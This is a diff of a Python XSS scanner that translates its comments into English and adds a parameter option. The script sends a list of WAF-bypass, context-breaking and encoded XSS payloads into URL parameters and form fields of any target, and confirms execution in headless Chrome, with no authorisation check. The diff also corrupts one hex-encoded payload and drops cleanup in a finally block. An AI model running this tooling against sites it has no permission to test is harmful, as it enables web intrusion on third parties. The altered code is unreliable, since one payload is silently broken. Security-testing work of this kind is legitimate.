@@ -1,66 +1,125 @@
 #!/usr/bin/env python3
-# scripts/xss_scanner.py
+# -*- coding: utf-8 -*-
+# xss_scanner.py - XSS vulnerability scanner
 
 import sys
 import json
 import requests
 import re
+import argparse
 from urllib.parse import urljoin, urlparse, parse_qs
 from bs4 import BeautifulSoup
-from selenium import webdriver
-from selenium.webdriver.chrome.options import Options
-from selenium.webdriver.common.by import By
-from selenium.webdriver.support.ui import WebDriverWait
-from selenium.webdriver.support import expected_conditions as EC
+
+try:
+    from selenium import webdriver
+    from selenium.webdriver.chrome.options import Options
+    from selenium.webdriver.common.by import By
+    from selenium.webdriver.support.ui import WebDriverWait
+    from selenium.webdriver.support import expected_conditions as EC
+    SELENIUM_AVAILABLE = True
+except ImportError:
+    SELENIUM_AVAILABLE = False
 
 class AdvancedXSSScanner:
-    def __init__(self, target_url):
+    def __init__(self, target_url, custom_params=None):
         self.target_url = target_url
+        self.custom_params = custom_params or []
         self.session = requests.Session()
         self.session.headers.update({
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
         })
         
-        # 高级 XSS payloads
+        # Advanced XSS payloads
         self.advanced_payloads = [
-            # WAF 绕过
+            # WAF bypass
             '<ScRiPt>alert("XSS")</ScRiPt>',
             '<script>alert(String.fromCharCode(88,83,83))</script>',
-            '<img src=x onerror=\x61lert("XSS")>',
+            '<img src=x onerror=alert("XSS")>',
             '"><svg onload=alert("XSS")>',
             
-            # 上下文绕过
+            # Context breaking
             '";alert("XSS");"',
             "';alert('XSS');//",
             '</textarea><script>alert("XSS")</script>',
             '</title><script>alert("XSS")</script>',
             
-            # 编码绕过
+            # Encoding bypass
             '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#88;&#83;&#83;&#34;&#41;">',
-            '<script>eval("\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x58\\x53\\x53\\x27\\x29")</script>',
+            '<script>eval("\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x58\\x53\\x83\\x27\\x29")</script>',
             
-            # 多重编码
+            # URL encoding
             '%3Cscript%3Ealert(%22XSS%22)%3C/script%3E',
             '&#60;script&#62;alert(&#34;XSS&#34;)&#60;/script&#62;',
         ]
         
         self.results = []
 
+    def scan_url_parameters(self):
+        """Scan URL parameters - prioritize custom params if provided"""
+        parsed_url = urlparse(self.target_url)
+        params = parse_qs(parsed_url.query)
+        
+        if self.custom_params:
+            # Use provided parameters
+            print(f"[INFO] Testing custom parameters: {self.custom_params}", file=sys.stderr)
+            for param in self.custom_params:
+                self.test_parameter(param, 'test_value')
+        elif params:
+            # Use existing URL parameters
+            print(f"[INFO] Testing URL parameters: {list(params.keys())}", file=sys.stderr)
+            for param_name, param_values in params.items():
+                self.test_parameter(param_name, param_values[0] if param_values else 'test')
+        else:
+            # Use common parameters
+            print("[INFO] No parameters found, testing common ones", file=sys.stderr)
+            common_params = ['q', 'search', 'query', 'id', 'page', 'category']
+            for param in common_params:
+                self.test_parameter(param, 'test_value')
+
+    def test_parameter(self, param_name, original_value):
+        """Test a single parameter for XSS vulnerabilities"""
+        base_url = self.target_url.split('?')[0]
+        
+        for payload in self.advanced_payloads:
+            try:
+                test_url = f"{base_url}?{param_name}={payload}"
+                response = self.session.get(test_url, timeout=10)
+                
+                vulnerable = self.detect_xss_in_response(response.text, payload)
+                
+                self.results.append({
+                    'payload': payload,
+                    'vulnerable': vulnerable,
+                    'method': 'url_parameter',
+                    'parameter': param_name,
+                    'url': test_url,
+                    'context': self.extract_context(response.text, payload) if vulnerable else None
+                })
+                
+            except Exception as e:
+                self.results.append({
+                    'payload': payload,
+                    'vulnerable': False,
+                    'error': str(e),
+                    'method': 'url_parameter',
+                    'parameter': param_name
+                })
+
     def scan_forms(self):
-        """扫描页面中的表单"""
+        """Scan forms in the page"""
         try:
             response = self.session.get(self.target_url, timeout=10)
             soup = BeautifulSoup(response.content, 'html.parser')
             forms = soup.find_all('form')
             
+            print(f"[INFO] Found {len(forms)} forms", file=sys.stderr)
+            
             for form in forms:
                 action = form.get('action', '')
                 method = form.get('method', 'get').lower()
                 
-                # 构建完整的 action URL
                 form_url = urljoin(self.target_url, action)
                 
-                # 获取表单字段
                 inputs = form.find_all(['input', 'textarea', 'select'])
                 form_data = {}
                 
@@ -69,9 +128,10 @@ class AdvancedXSSScanner:
                     if name:
                         input_type = input_field.get('type', 'text')
                         if input_type not in ['submit', 'reset', 'button']:
-                            form_data[name] = 'test_value'
+                            # Only test if no custom params or field is in custom params
+                            if not self.custom_params or name in self.custom_params:
+                                form_data[name] = 'test_value'
                 
-                # 测试表单
                 if form_data:
                     self.test_form(form_url, method, form_data)
                     
@@ -84,11 +144,10 @@ class AdvancedXSSScanner:
             })
 
     def test_form(self, form_url, method, form_data):
-        """测试单个表单的 XSS 漏洞"""
-        for payload in self.advanced_payloads[:5]:  # 限制测试数量
+        """Test a single form for XSS vulnerabilities"""
+        for payload in self.advanced_payloads[:5]:  # Limit to 5 payloads for forms
             test_data = form_data.copy()
             
-            # 在每个字段中测试 payload
             for field_name in test_data:
                 test_data[field_name] = payload
                 
@@ -118,60 +177,16 @@ class AdvancedXSSScanner:
                         'field': field_name
                     })
                 
-                # 恢复原始值
+                # Reset the field value
                 test_data[field_name] = form_data[field_name]
 
-    def scan_url_parameters(self):
-        """扫描 URL 参数"""
-        parsed_url = urlparse(self.target_url)
-        params = parse_qs(parsed_url.query)
-        
-        if not params:
-            # 如果没有参数，尝试常见参数名
-            common_params = ['q', 'search', 'query', 'id', 'page', 'category']
-            for param in common_params:
-                self.test_parameter(param, 'test_value')
-        else:
-            # 测试现有参数
-            for param_name, param_values in params.items():
-                self.test_parameter(param_name, param_values[0] if param_values else 'test')
-
-    def test_parameter(self, param_name, original_value):
-        """测试单个参数的 XSS 漏洞"""
-        base_url = self.target_url.split('?')[0]
-        
-        for payload in self.advanced_payloads:
-            try:
-                test_url = f"{base_url}?{param_name}={payload}"
-                response = self.session.get(test_url, timeout=10)
-                
-                vulnerable = self.detect_xss_in_response(response.text, payload)
-                
-                self.results.append({
-                    'payload': payload,
-                    'vulnerable': vulnerable,
-                    'method': 'url_parameter',
-                    'parameter': param_name,
-                    'url': test_url,
-                    'context': self.extract_context(response.text, payload) if vulnerable else None
-                })
-                
-            except Exception as e:
-                self.results.append({
-                    'payload': payload,
-                    'vulnerable': False,
-                    'error': str(e),
-                    'method': 'url_parameter',
-                    'parameter': param_name
-                })
-
     def detect_xss_in_response(self, response_text, payload):
-        """检测响应中是否存在 XSS"""
-        # 直接匹配
+        """Check if XSS payload is reflected in response"""
+        # Direct match
         if payload in response_text:
             return True
         
-        # 检查危险模式
+        # Check dangerous patterns
         dangerous_patterns = [
             r'<script[^>]*>.*?</script>',
             r'javascript:',
@@ -187,7 +202,7 @@ class AdvancedXSSScanner:
         return False
 
     def extract_context(self, response_text, payload):
-        """提取 payload 在响应中的上下文"""
+        """Extract context around payload in response"""
         try:
             index = response_text.find(payload)
             if index != -1:
@@ -199,7 +214,11 @@ class AdvancedXSSScanner:
         return None
 
     def dynamic_scan_with_selenium(self):
-        """使用 Selenium 进行动态扫描"""
+        """Dynamic scanning using Selenium (if available)"""
+        if not SELENIUM_AVAILABLE:
+            print("[WARNING] Selenium not installed, skipping dynamic scan", file=sys.stderr)
+            return
+            
         chrome_options = Options()
         chrome_options.add_argument('--headless')
         chrome_options.add_argument('--no-sandbox')
@@ -209,7 +228,6 @@ class AdvancedXSSScanner:
         try:
             driver = webdriver.Chrome(options=chrome_options)
             
-            # 测试基本 payload
             test_payloads = [
                 '<script>document.title="XSS_DETECTED"</script>',
                 '<img src=x onerror="document.title=\'IMG_XSS_DETECTED\'">',
@@ -220,12 +238,10 @@ class AdvancedXSSScanner:
                     test_url = f"{self.target_url}{'&' if '?' in self.target_url else '?'}test={payload}"
                     driver.get(test_url)
                     
-                    # 等待页面加载
                     WebDriverWait(driver, 5).until(
                         lambda d: d.execute_script("return document.readyState") == "complete"
                     )
                     
-                    # 检查标题是否被修改（说明 JavaScript 执行了）
                     title = driver.title
                     vulnerable = 'XSS_DETECTED' in title or 'IMG_XSS_DETECTED' in title
                     
@@ -244,6 +260,8 @@ class AdvancedXSSScanner:
                         'method': 'selenium_dynamic'
                     })
             
+            driver.quit()
+            
         except Exception as e:
             self.results.append({
                 'payload': 'selenium_scan',
@@ -251,27 +269,23 @@ class AdvancedXSSScanner:
                 'error': f'Selenium setup failed: {str(e)}',
                 'method': 'selenium_dynamic'
             })
-        finally:
-            try:
-                driver.quit()
-            except:
-                pass
 
     def run_scan(self):
-        """运行完整扫描"""
+        """Run complete XSS scan"""
         try:
-            # 1. URL 参数扫描
+            print(f"[INFO] Starting XSS scan for: {self.target_url}", file=sys.stderr)
+            
+            # 1. URL parameter scan
             self.scan_url_parameters()
             
-            # 2. 表单扫描
+            # 2. Form scan
             self.scan_forms()
             
-            # 3. 动态扫描（如果安装了 Selenium）
-            try:
+            # 3. Dynamic scan (if Selenium available)
+            if SELENIUM_AVAILABLE:
                 self.dynamic_scan_with_selenium()
-            except ImportError:
-                # Selenium 未安装，跳过动态扫描
-                pass
+            
+            print(f"[INFO] Scan completed. Total tests: {len(self.results)}", file=sys.stderr)
             
         except Exception as e:
             self.results.append({
@@ -284,15 +298,26 @@ class AdvancedXSSScanner:
         return self.results
 
 def main():
-    if len(sys.argv) != 2:
-        print("Usage: python3 xss_scanner.py <target_url>")
-        sys.exit(1)
+    # Parse command line arguments
+    parser = argparse.ArgumentParser(description='Advanced XSS Scanner')
+    parser.add_argument('url', help='Target URL to scan')
+    parser.add_argument('--params', 
+                       help='Comma-separated list of parameters to test',
+                       default='')
     
-    target_url = sys.argv[1]
-    scanner = AdvancedXSSScanner(target_url)
+    args = parser.parse_args()
+    
+    # Process parameters
+    custom_params = []
+    if args.params:
+        custom_params = [p.strip() for p in args.params.split(',') if p.strip()]
+        print(f"[DEBUG] Received params from TypeScript: {custom_params}", file=sys.stderr)
+    
+    # Create scanner and run
+    scanner = AdvancedXSSScanner(args.url, custom_params)
     results = scanner.run_scan()
     
-    # 输出 JSON 格式结果
+    # Output JSON results
     print(json.dumps(results, indent=2))
 
 if __name__ == "__main__":
